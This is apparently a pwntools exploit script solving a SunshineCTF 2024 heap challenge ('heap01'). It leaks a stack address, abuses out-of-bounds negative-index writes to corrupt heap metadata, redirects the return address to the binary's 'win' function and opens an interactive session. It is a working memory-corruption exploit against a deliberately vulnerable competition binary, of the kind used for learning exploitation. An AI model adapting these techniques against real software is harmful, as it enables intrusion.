#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './heap01_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '2024.sunshinectf.games', 24006

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x040148d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
RET = 0x00401554
def exploit():
    global io
    io = initialize()

    io.recvuntil(b'leak? ')
    io.sendline()
    io.recvline()
    stack = int(io.recvline().strip(), 16)
    rip = stack + 0x28

    io.sendlineafter(b'size:', str(0x40).encode())
    io.recvuntil(b'go: 0x')
    _ = int(io.recvline().strip(), 16) 

    io.sendlineafter(b'Index:', str(-577).encode())
    io.sendlineafter(b'Value:', str(rip-0x8).encode())

    io.sendlineafter(b'Index:', str(-596).encode())
    io.sendlineafter(b'Value:', str(0x0001000000000000).encode())

    io.sendlineafter(b'Value', str(0x0).encode())
    io.sendlineafter(b'Value', str(RET).encode())
    io.sendlineafter(b'Value', str(elf.sym['win']).encode())

    log.info('stack leak: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
